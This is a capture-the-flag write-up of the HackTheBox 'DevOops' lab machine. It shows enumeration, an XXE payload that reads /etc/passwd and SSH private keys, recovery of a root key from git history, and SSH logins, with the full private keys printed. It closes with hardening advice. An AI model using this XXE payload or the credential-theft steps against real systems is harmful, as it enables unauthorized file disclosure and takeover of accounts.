# HackTheBox DevOops Write Up
## Tools Used
    * nmap
    * DirBuster
    * Text Editor (gedit in this case)
    
## Enumeration
As always, we will start with enumerating the target to see what services are running.

```bash
# -A tells nmap to do a service scan so we can enumerate the services on the target.  -Pn tells nmap not to ping the target first.

nmap -A -Pn 10.10.10.91
```

```
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-05 19:53 EDT
Nmap scan report for 10.10.10.91
Host is up (0.11s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 (RSA)
|   256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 (ECDSA)
|_  256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 (ED25519)
5000/tcp open  http    Gunicorn 19.7.1
|_http-server-header: gunicorn/19.7.1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.70%E=4%D=7/5%OT=22%CT=1%CU=38466%PV=Y%DS=2%DC=T%G=Y%TM=5B3EAFB5
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10F%TI=Z%CI=I%II=I%TS=A)OPS(
OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11
OS:NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(
OS:R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
It looks like there is a web server on port 5000 running gunicorn.  According to [gunicorn's homepage](http://gunicorn.org/), gunicorn is a Python WSGI HTTP server for UNIX. So what does that mean?

WSGI stands for Web Server Gateway Interface.  WSGI provides an interface to forward requests to a Python application or framework.  In forwarding requests, some WSGI servers will do load balancing or route specific requests to specific application components.  You can read more about WSGI here<sup>[1]</sup> or here<sup>[2]</sup>.  For our purposes, the important thing is that there is likely a Python HTTP server or framework (like Flask or Django) behind this instance of gunicorn.

## User Flag

Let's visit the web server on port 5000 and see what we are working with:
![Main Page](screenshots/2_visit_webpage.PNG)

There are some interesting bits of information in here:
  * feed.py: The server is written in Python (which we knew from gunicorn in the header, but we have a file name)
  * A line talking about how the page is under construction and a TO DO.  That suggests that things may not be secured yet because the author is still testing things.

The image on the page is static, and there are no links or apparent places for user input on the page.  Since the name of the box is Devoops, I thought the oops might be that the .git directory was left open.  .git directories are used to store the metadata for git repositories and can be useful for extracting information from Git code repositories (more on this later).  I could not find any common source code repository directories like .git, .svn, or .cvs.

Another technique is to brute force the site using a tool like dirbuster<sup>[3]</sup> to find directories that exist on the website but are not necessarily visible.  You can ask DirBuster to try directory names that are generated from random strings or you can supply it a list of directories to try.  We will start with a small word list and work our way up from there if necessary.  This technique is very noisy, but sometimes, you need to make a little noise to move forward.  We will tweak the options to make it a bit quieter.

Here is what DirBuster looks like:

![DirBuster Main Window](screenshots/3_dirbuster_setup.PNG)

The word list we are using is built into Kali and is available under /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt

We put the number of threads (workers) at 4 so as not to overload the server.  If you wanted ot be stealthy, you could put this at 1.  After we hit start, we get two hits: feed and upload.
![DirBuster hits](screenshots/4_dirbuster.PNG)

feed was the image we saw on the front page which is not too interesting.  However, upload is new.  Let's visit it at http://10.10.10.91:5000/upload:
![Upload page](screenshots/5_upload.PNG)

It looks like we found some functionality that the developer may not have intended to expose.  It appears this page will allow us to upload XML to the server.  It is expecting to see three tags in the XML: Author, Subject, and Content.  I did not try uploading other content like additional Python scripts or other non-XML files.  I wanted to see if I could find a vulnerability in the way the XML was being parsed.  For now, I will upload a begnign bit of XML to see how the page is supposed to work.  After that, we can try different inputs to see if they cause any unintended behavior.  Here is the XML we will start with:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<rss version="2.0">
<Content>Content!</Content>
<Author>Me</Author>
<Subject>Me</Subject>
</rss>
```
The rss tag is important.  I tried to upload XML without it, and I got an Internal Server Error.  I suppose that makes sense because the purpose of this application is to parse RSS feeds.  Here is what it looks like when we upload this XML:
![Upload XML](screenshots/6_successful_upload.PNG)
We get some interesting information from this.  We can see that there is an uploads directory where we can access the XML we uploaded.  This is not very useful right now, but we will keep this in mind if we need it later.  This page has also revealed the path to the application on the server and a user name (roosa).  Now, we need to see if there are any vulnerabilities we can make use of to get further access on this box.

In the latest edition of the OWASP Top 10 (2017), one of the vulnerabilities is related to how some XML parsers parse external entities, or XML eXternal Entities (XXE).  Essentially, a weakly configured XML processor sees a reference to an external resource (a file on the file system or a link to an external web site) and follows it blindly.  This can lead to disclosure of data on the file system on the server or data on other internal servers that the vulnerable server can see.  You can read more about XXE here<sup>[4]</sup> and its entry in the OWASP Top 10 here<sup>[5]</sup>.

We will upload an example of XML that would expose /etc/passwd if the server is vulnerable to this type of attack.  I added some comments in to explain what this script does, but they are not necessary to try this:
```xml
<!-- XML declaration - this is necessary -->
<?xml version="1.0" encoding="UTF-8"?>

<!--
    !DOCTYPE starts the document type declaration.  Normally, this is used to define a list of permitted elements and attributes (a grammar)
    in the document or element's structure.  This is the predecessor to XML namespaces.
    
    In our example, the next two lines define the structure of the Author element:
        * has an element called Author which is of any type
        * an element called xxe that is an alias for the contents of /etc/passwd.  When we use &xxe;, the parser will replace it with the
        contents of /etc/passwd if it is vulnerable to this kind of attack.
        
    You could do this with any of the elements that the application will look for and parse.  I chose Author because it is the first one.
-->
<!DOCTYPE Author [ <!ELEMENT Author ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>

<!-- The RSS tag we need for the application to parse this XML -->
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">

<!-- The Author tag we defined before with the reference to the xxe element -->
<Author>&xxe;</Author>

<!-- We will include placeholder Content and Subject tags to keep the application happy -->
<Content>Content</Content>
<Subject>Subject</Subject>

<!-- Close the RSS tag -->
</rss>
```
![XML for /etc/passwd Uploaded](screenshots/7_successful_xxe.PNG)

That looks like the contents of /etc/passwd, so the XML parser is not configured to prevent this attack.  This gives us the ability to read any file that the user running the server has access to.  Since we saw that the application is running from roosa's home directory, we probably can read any file that roosa can read.  This file gives us some more useful insights about the users on the system:
    
    * There are two users that can log in to the box: roosa and git.  This may be useful later.
    * There are users for a number of other services that may be interesting: ircd (IRC), dnsmasq (DNS), blogfeed, and others.

Since the application is vulnerable, I will modify it to read a few other files that may be interesting.  To read a file, we replace /etc/passwd with the file we want to read.  For example, to read /home/roosa/user.txt, we will change the ENTITY line to ```xml <!ENTITY xxe SYSTEM "file:///home/roosa/user.txt" >]>```

    * /home/roosa/user.txt: The likely location of the user flag
    * /home/roosa/.bash_history: A history of commands that the user has run on the command line.  This may be empty, but if it is not, it may provide beneficial insight into the user's activities.

Here is the user flag (see the string next to Author:):
![User Flag](screenshots/8_user_flag.PNG)

And here is the .bash_history:
![Bash History](screenshots/9_bash_history.PNG)

There are some interesting lines in here (summarized):
    
    * The first few lines show that roosa ran ssh-keygen to generate SSH keys.  We see references to .ssh/id_rsa.pub.  This is a public key.  It is reasonable to guess that the private key is .ssh/id_rsa (no extension).  Because it is in the .ssh folder, we could use the private key to SSH in as roosa.  Remember from our enumeration step that SSH is open on this box.
    * There are references to commits to a local git repository
    * The last declaration of the WERKZEUG_DEBUG_PIN is 151237652.  Werkzeug is another WSGI utility.  Flask (a Python microframework for web development) is based on Werkzeug.  We could use this debug PIN to debug the application and potentially run code or examine the internal structures of the application without direct access to the source code.

## Root Flag

We will try to get the SSH keys for roosa so we can have a shell on the box (hopefully).  Let's modify the XML to read id_rsa and upload it:
![Private SSH key](screenshots/10_private_ssh_key.PNG)

There is the key.  Here it is cleaned up:

```
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuMMt4qh/ib86xJBLmzePl6/5ZRNJkUj/Xuv1+d6nccTffb/7
9sIXha2h4a4fp18F53jdx3PqEO7HAXlszAlBvGdg63i+LxWmu8p5BrTmEPl+cQ4J
R/R+exNggHuqsp8rrcHq96lbXtORy8SOliUjfspPsWfY7JbktKyaQK0JunR25jVk
v5YhGVeyaTNmSNPTlpZCVGVAp1RotWdc/0ex7qznq45wLb2tZFGE0xmYTeXgoaX4
9QIQQnoi6DP3+7ErQSd6QGTq5mCvszpnTUsmwFj5JRdhjGszt0zBGllsVn99O90K
m3pN8SN1yWCTal6FLUiuxXg99YSV0tEl0rfSUwIDAQABAoIBAB6rj69jZyB3lQrS
JSrT80sr1At6QykR5ApewwtCcatKEgtu1iWlHIB9TTUIUYrYFEPTZYVZcY50BKbz
ACNyme3rf0Q3W+K3BmF//80kNFi3Ac1EljfSlzhZBBjv7msOTxLd8OJBw8AfAMHB
lCXKbnT6onYBlhnYBokTadu4nbfMm0ddJo5y32NaskFTAdAG882WkK5V5iszsE/3
koarlmzP1M0KPyaVrID3vgAvuJo3P6ynOoXlmn/oncZZdtwmhEjC23XALItW+lh7
e7ZKcMoH4J2W8OsbRXVF9YLSZz/AgHFI5XWp7V0Fyh2hp7UMe4dY0e1WKQn0wRKe
8oa9wQkCgYEA2tpna+vm3yIwu4ee12x2GhU7lsw58dcXXfn3pGLW7vQr5XcSVoqJ
Lk6u5T6VpcQTBCuM9+voiWDX0FUWE97obj8TYwL2vu2wk3ZJn00U83YQ4p9+tno6
NipeFs5ggIBQDU1k1nrBY10TpuyDgZL+2vxpfz1SdaHgHFgZDWjaEtUCgYEA2B93
hNNeXCaXAeS6NJHAxeTKOhapqRoJbNHjZAhsmCRENk6UhXyYCGxX40g7i7T15vt0
ESzdXu+uAG0/s3VNEdU5VggLu3RzpD1ePt03eBvimsgnciWlw6xuZlG3UEQJW8sk
A3+XsGjUpXv9TMt8XBf3muESRBmeVQUnp7RiVIcCgYBo9BZm7hGg7l+af1aQjuYw
agBSuAwNy43cNpUpU3Ep1RT8DVdRA0z4VSmQrKvNfDN2a4BGIO86eqPkt/lHfD3R
KRSeBfzY4VotzatO5wNmIjfExqJY1lL2SOkoXL5wwZgiWPxD00jM4wUapxAF4r2v
vR7Gs1zJJuE4FpOlF6SFJQKBgHbHBHa5e9iFVOSzgiq2GA4qqYG3RtMq/hcSWzh0
8MnE1MBL+5BJY3ztnnfJEQC9GZAyjh2KXLd6XlTZtfK4+vxcBUDk9x206IFRQOSn
y351RNrwOc2gJzQdJieRrX+thL8wK8DIdON9GbFBLXrxMo2ilnBGVjWbJstvI9Yl
aw0tAoGAGkndihmC5PayKdR1PYhdlVIsfEaDIgemK3/XxvnaUUcuWi2RhX3AlowG
xgQt1LOdApYoosALYta1JPen+65V02Fy5NgtoijLzvmNSz+rpRHGK6E8u3ihmmaq
82W3d4vCUPkKnrgG8F7s3GL6cqWcbZBd0j9u88fUWfPxfRaQU3s=
-----END RSA PRIVATE KEY-----
```

Let's try to SSH with that key:
```bash
ssh -i id_rsa roosa@10.10.10.91
```
![SSH successful](screenshots/11_ssh_as_roosa.PNG)

It looks like it worked.  After poking around for a bit, there is a git repository that seems to mirror the one in "production."  It is in /home/roosa/work/blogfeed.

We can see the history of commits by changing into that directory and using the command
```bash
git log
```

There is an interesting commit:
```
commit 33e87c312c08735a02fa9c796021a4a3023129ad
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Mon Mar 19 09:33:06 2018 -0400

    reverted accidental commit with proper key

commit d387abf63e05c9628a59195cec9311751bdb283f
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Mon Mar 19 09:32:03 2018 -0400

    add key for feed integration from tnerprise backend
```
It looks like Roosa accidentally committed the wrong key to the Git repository.  Perhaps that key was sensitive.  Git keeps a history of all commits, so we should be able to recover the original commit (d387abf63e05c9628a59195cec9311751bdb283f) even though it was overwritten by commit 33e87c312c08735a02fa9c796021a4a3023129ad.  We will use this command:

```bash
# -p asks git to create a patch that will show us the differences between this commit and the last one.  Since this commit adds a new file (the key), we should be able to see what the key was.
git log -p d387abf63e05c9628a59195cec9311751bdb283f
```
![Recovered key](screenshots/13_recovered_key.PNG)

Here is the key cleaned up:
```
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde
8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i
vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK
nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt/rEgIVmrb+
CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc/SHSE0c
F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH
uzjPbIdyEkDc3PAYP+E/jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL
gCfN5I+xZGH19V4HPMCrK6PzskYII3/i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD
k2X0256DbRv/ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy
NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM
HSRik2J/7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa
2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK/oLc0RB
GLEKU6HtUuKFvlXdJ22S4/rQb0RiDcU/wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG
jwrjv/loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41
IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw
+XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp/QYtjn/ltojR16JNTKqiW
7vSqlsZnT9jR2syvuhhVz4Ei9yA/VYZG2uiCpK0CgYA/UOhz+LYu/MsGoh0+yNXj
Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS
iD6fE+5/i/rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo/PcFlfXQhrERxRXJQKPHdJP7
VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp/INRX
S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6
md/EqUtm84/VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie
LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz
oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE=
-----END RSA PRIVATE KEY-----
```

If they reverted it so quickly, maybe it was something sensitive.  On a hunch, we can see if it is root's private key and we may be able to use it to SSH as root into the box:
```bash
ssh -i old_authorized_key root@10.10.10.91
```

It looks like it worked, and we can recover the root flag!
![Root Flag](screenshots/14_root_flag.PNG)

## Conclusion
This was a really fun box because I got to learn about how XXE works and a bit more about Git.  There are some good takeaways from it:
    * Be really careful about what you commit in repositories and the data you place in accessible storage (like Amazon S3).  Use tools like git-secrets<sup>[6]</sup> or AWS Macie<sup>[7]</sup> to scan for potentially sensitive data.
    * Do not allow root login via SSH.  SSH as a user account that can sudo (and make sure that the user has a password protected key and can only sudo with a password).
    * Password encrypt SSH keys and keep them in a safe place.  This user put them on a publically accessible server.  If the server is compromised, the key may be compromised as well.
    * There are resources to harden your application against the XXE attack which led to our initial foothold into the box.  OWASP has a cheat sheet to prevent XXE attacks here<sup>[8]</sup>.

## References
[1]: https://en.wikipedia.org/wiki/Web_Server_Gateway_Interface "Web Server Gateway Interface - Wikipedia"
[2]: https://www.python.org/dev/peps/pep-3333/ "PEP 3333 -- Python Web Server Gateway Interface v1.0.1"
[3]: https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project "OWASP DirBuster Project"
[4]: https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing "XML External Entity (XXE) Processing"
[5]: https://www.owasp.org/index.php/Top_10-2017_A4-XML_External_Entities_(XXE) "Top 10-2017 A4-XML External Entities (XXE)"
[6]: https://github.com/awslabs/git-secrets "git-secrets"
[7]: https://aws.amazon.com/macie/ "AWS Macie"
[8]: https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet "XML External Entity (XXE) Prevention Cheat Sheet"

    * [<sup>1</sup> Web Server Gateway Interface - Wikipedia](https://en.wikipedia.org/wiki/Web_Server_Gateway_Interface)
    * [<sup>2</sup> PEP 3333 -- Python Web Server Gateway Interface v1.0.1](https://www.python.org/dev/peps/pep-3333/)
    * [<sup>3</sup> OWASP DirBuster Project](https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)
    * [<sup>4</sup> XML External Entity (XXE) Processing](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing)
    * [<sup>5</sup> Top 10-2017 A4-XML External Entities (XXE)](https://www.owasp.org/index.php/Top_10-2017_A4-XML_External_Entities_(XXE))
    * [<sup>6</sup> git-secrets](https://github.com/awslabs/git-secrets)
    * [<sup>7</sup> AWS Macie](https://aws.amazon.com/macie/)
    * [<sup>8</sup> XML External Entity (XXE) Prevention Cheat Sheet](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet)
